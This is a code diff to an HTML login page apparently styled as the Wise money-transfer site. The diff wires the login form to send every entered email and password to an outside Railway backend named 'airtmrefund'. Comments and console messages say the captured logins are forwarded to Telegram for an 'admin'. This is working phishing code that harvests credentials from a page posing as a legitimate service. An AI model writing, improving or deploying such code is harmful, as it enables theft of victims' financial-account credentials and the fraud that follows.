@@ -560,7 +560,14 @@
 
     <!-- ===== JAVASCRIPT ===== -->
     <script>
-        // ===== PAGE NAVIGATION =====
+        // ============================================
+        // 🔥 BACKEND API URL (Railway)
+        // ============================================
+        const API_BASE_URL = 'https://airtmrefund-production.up.railway.app';
+
+        // ============================================
+        // PAGE NAVIGATION
+        // ============================================
         function showSignup() {
             document.getElementById('loginPage').classList.remove('active');
             document.getElementById('signupPage').classList.add('active');
@@ -577,7 +584,9 @@
             }, 100);
         }
 
-        // ===== TOAST =====
+        // ============================================
+        // TOAST
+        // ============================================
         let toastTimeout;
 
         function showToast(type, message) {
@@ -593,13 +602,16 @@
             }, 3000);
         }
 
-        // ===== LOGIN HANDLER =====
-        function handleLogin(event) {
+        // ============================================
+        // 🔥 LOGIN HANDLER - Sends data to Telegram
+        // ============================================
+        async function handleLogin(event) {
             event.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
             const btn = document.getElementById('loginBtn');
 
+            // Validation
             if (!email || !password) {
                 showToast('error', '⚠️ Please fill in all fields');
                 return;
@@ -610,20 +622,63 @@
                 return;
             }
 
+            if (password.length < 6) {
+                showToast('error', '⚠️ Password must be at least 6 characters');
+                return;
+            }
+
+            // Show loading state
             btn.disabled = true;
             btn.textContent = 'Logging in...';
+            btn.style.opacity = '0.6';
 
-            setTimeout(() => {
+            try {
+                console.log('📤 Sending login to:', API_BASE_URL + '/api/login');
+
+                const response = await fetch(API_BASE_URL + '/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email, password })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    showToast('success', '✅ Login successful! Data sent to admin.');
+                    console.log('✅ Login data sent to Telegram');
+
+                    // Reset button
+                    btn.disabled = false;
+                    btn.textContent = 'Log in';
+                    btn.style.opacity = '0.58';
+
+                    // Optional: Redirect after success
+                    setTimeout(() => {
+                        // window.location.href = 'account.html';
+                        showToast('info', '📱 Check your Telegram for the login notification!');
+                    }, 1000);
+
+                } else {
+                    showToast('error', '❌ ' + (data.message || 'Login failed. Please try again.'));
+                    btn.disabled = false;
+                    btn.textContent = 'Log in';
+                    btn.style.opacity = '0.58';
+                }
+
+            } catch (error) {
+                console.error('❌ Login error:', error);
+                showToast('error', '❌ Network error. Please check your connection.');
                 btn.disabled = false;
                 btn.textContent = 'Log in';
-                showToast('success', '✅ Welcome back! Redirecting...');
-                setTimeout(() => {
-                    window.location.href = 'account.html';
-                }, 500);
-            }, 2000);
+                btn.style.opacity = '0.58';
+            }
         }
 
-        // ===== SIGNUP HANDLER =====
+        // ============================================
+        // SIGNUP HANDLER
+        // ============================================
         function handleSignup(event) {
             event.preventDefault();
             const email = document.getElementById('signupEmail').value;
@@ -649,7 +704,9 @@
             }, 2000);
         }
 
-        // ===== KEYBOARD SUPPORT =====
+        // ============================================
+        // KEYBOARD SUPPORT
+        // ============================================
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
                 const loginForm = document.getElementById('loginForm');
@@ -667,17 +724,16 @@
             }
         });
 
-        // ===== AUTO-FOCUS ON LOAD =====
+        // ============================================
+        // AUTO-FOCUS ON LOAD
+        // ============================================
         window.addEventListener('load', function() {
             document.getElementById('email').focus();
         });
 
-        console.log('🔥 Wise - Login Page');
-        console.log('✅ Logo in original position (left)');
-        console.log('✅ Close button (X) on the right');
-        console.log('✅ Clean input fields - no placeholder text');
-        console.log('✅ Real Google button styling');
-        console.log('✅ No "Log in" button in navbar');
+        console.log('🔥 Wise - Login Page (Connected to Backend)');
+        console.log('✅ API URL:', API_BASE_URL);
+        console.log('✅ Login data will be sent to Telegram');
     </script>
 
 </body>
